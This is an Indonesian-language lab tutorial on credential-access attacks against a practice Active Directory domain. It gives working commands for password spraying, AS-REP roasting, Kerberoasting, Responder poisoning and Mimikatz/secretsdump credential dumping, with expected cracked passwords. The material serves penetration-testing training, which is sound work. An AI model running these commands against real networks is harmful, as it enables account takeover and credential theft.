# 🔐 Skenario Serangan: Credential Access

## Gambaran Umum

Setelah enumerasi, langkah berikutnya adalah mendapatkan credential (username + password/hash) yang memungkinkan akses lebih dalam ke domain. Fase ini mencakup berbagai teknik dari password spraying hingga Kerberos attack.

---

## Skenario 1: Password Spraying

**Tujuan:** Menemukan akun dengan password lemah atau umum.

**MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying

**Penjelasan:** Password spraying mencoba **satu password** ke **banyak akun** sekaligus. Ini menghindari account lockout (yang biasanya dipicu oleh banyak percobaan ke satu akun). Di lab kita, lockout policy di-set ke 0 (tanpa lockout), tapi di dunia nyata teknik ini tetap relevan.

```bash
# Buat file daftar user
cat > /tmp/domain_users.txt << 'EOF'
j.doe
s.admin
helpdesk
m.dev
a.intern
l.jones
r.smith
d.wilson
k.brown
svc_backup
svc_sql
svc_web
EOF

# Buat file daftar password umum
cat > /tmp/passwords.txt << 'EOF'
Welcome2024!
Password123
Summer2024!
P@ssw0rd123
Company2024!
Corp2024!
EOF

# Menggunakan CrackMapExec
crackmapexec smb 192.168.56.10 -u /tmp/domain_users.txt -p "Welcome2024!" --continue-on-success

# Menggunakan kerbrute (lebih stealth, via Kerberos)
kerbrute passwordspray --dc 192.168.56.10 -d corp.local /tmp/domain_users.txt "Welcome2024!"

# Spray multiple passwords
for pass in $(cat /tmp/passwords.txt); do
    echo "[*] Trying: $pass"
    kerbrute passwordspray --dc 192.168.56.10 -d corp.local /tmp/domain_users.txt "$pass"
    echo "---"
done
```

**Hasil yang diharapkan:** Beberapa akun ditemukan menggunakan `Welcome2024!` (j.doe, r.smith, k.brown).

---

## Skenario 2: AS-REP Roasting

**Tujuan:** Mendapatkan hash yang bisa di-crack dari akun yang tidak membutuhkan Kerberos pre-authentication.

**MITRE ATT&CK:** T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting

**Penjelasan:** Jika sebuah akun memiliki flag "Do not require Kerberos preauthentication" aktif, attacker bisa meminta AS-REP (Authentication Service Response) dari KDC tanpa perlu password apapun. Respons ini berisi data yang dienkripsi dengan password hash user, yang bisa di-crack secara offline.

```bash
# Cari akun tanpa pre-auth (tidak butuh credential)
impacket-GetNPUsers corp.local/ -dc-ip 192.168.56.10 -usersfile /tmp/domain_users.txt -format hashcat -outputfile asrep_hashes.txt

# Atau jika sudah punya credential domain user
impacket-GetNPUsers corp.local/j.doe:Welcome2024! -dc-ip 192.168.56.10 -request -format hashcat -outputfile asrep_hashes.txt

# Crack hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Atau dengan John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

**Hasil yang diharapkan:** Hash svc_web ditemukan dan berhasil di-crack menjadi `WebApp2024!`.

---

## Skenario 3: Kerberoasting

**Tujuan:** Mendapatkan TGS hash dari service account untuk di-crack secara offline.

**MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

**Penjelasan:** Setiap akun domain dengan SPN (Service Principal Name) bisa menjadi target. Siapa pun dengan akun domain valid bisa meminta TGS untuk SPN tersebut, dan TGS dienkripsi dengan password hash service account.

```bash
# Enumerasi user dengan SPN
impacket-GetUserSPNs corp.local/j.doe:Welcome2024! -dc-ip 192.168.56.10

# Request TGS dan simpan hash untuk cracking
impacket-GetUserSPNs corp.local/j.doe:Welcome2024! -dc-ip 192.168.56.10 -request -outputfile kerberoast_hashes.txt

# Lihat hash yang didapat
cat kerberoast_hashes.txt

# Crack menggunakan hashcat (mode 13100 untuk Kerberoast)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force

# Atau menggunakan John
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

**Hasil yang diharapkan:** Hash svc_backup, svc_sql, dan svc_web ditemukan. Password berhasil di-crack: `Backup2024!`, `SQLService2024!`, `WebApp2024!`.

---

## Skenario 4: LLMNR/NBT-NS Poisoning

**Tujuan:** Menangkap NTLMv2 hash dari user yang melakukan name resolution broadcast.

**MITRE ATT&CK:** T1557.001 — Adversary-in-the-Middle: LLMNR/mDNS/NBT-NS Poisoning

**Penjelasan:** Ketika DNS gagal me-resolve nama (misal user salah ketik `\\fileserber` bukan `\\filesrv`), Windows jatuh ke LLMNR/NBT-NS yang melakukan broadcast ke jaringan lokal. Responder menjawab broadcast ini dan menangkap NTLMv2 hash.

```bash
# Jalankan Responder di Kali
sudo responder -I eth0 -dwv

# Di mesin Windows (CLIENT01), simulasikan query yang salah:
# Buka File Explorer → ketik: \\fileserber\share
# Atau di Command Prompt: net use \\fileserber\share

# Responder akan menangkap NTLMv2 hash di output
# Hash juga disimpan di: /usr/share/responder/logs/

# Crack NTLMv2 hash
hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt
```

**Hasil yang diharapkan:** NTLMv2 hash dari user yang login di CLIENT01 ditangkap.

---

## Skenario 5: Credential Dumping (Setelah Dapat Akses ke Mesin)

**Tujuan:** Mengekstrak credential dari memori atau database lokal setelah mendapat akses admin ke mesin.

**MITRE ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory

**Penjelasan:** Jika attacker sudah mendapatkan akses local admin ke mesin Windows, mereka bisa mengekstrak password/hash dari memori LSASS (Local Security Authority Subsystem Service) yang menyimpan credential user yang sedang login.

### Dari Kali (remote)

```bash
# Menggunakan Impacket secretsdump (butuh local admin)
impacket-secretsdump corp.local/helpdesk:Helpdesk2024!@192.168.56.30

# Dump SAM database
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Menggunakan CrackMapExec
crackmapexec smb 192.168.56.30 -u "helpdesk" -p "Helpdesk2024!" --sam
crackmapexec smb 192.168.56.30 -u "helpdesk" -p "Helpdesk2024!" --lsa
```

### Dari Target Windows (jika sudah punya akses)

```powershell
# Menggunakan Mimikatz (jalankan sebagai Administrator)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump hash saja
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# Dump credential dari memori
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
```

---

## Ringkasan Credential yang Dikumpulkan

Setelah menjalankan semua skenario, kamu seharusnya memiliki:

| Source          | Username                | Credential            | Metode                |
|-----------------|-------------------------|-----------------------|-----------------------|
| Password Spray  | j.doe, r.smith, k.brown | Welcome2024!          | CrackMapExec/kerbrute |
| AS-REP Roast    | svc_web                 | WebApp2024!           | Impacket GetNPUsers   |
| Kerberoast      | svc_backup              | Backup2024!           | Impacket GetUserSPNs  |
| Kerberoast      | svc_sql                 | SQLService2024!       | Impacket GetUserSPNs  |
| File Share      | svc_backup, svc_sql     | (dari script/config)  | SMB enumeration       |
| Responder       | (user di CLIENT01)      | NTLMv2 hash → crack   | LLMNR poisoning       |
| Credential Dump | (logged-in users)       | NTLM hash / plaintext | Mimikatz/secretsdump  |
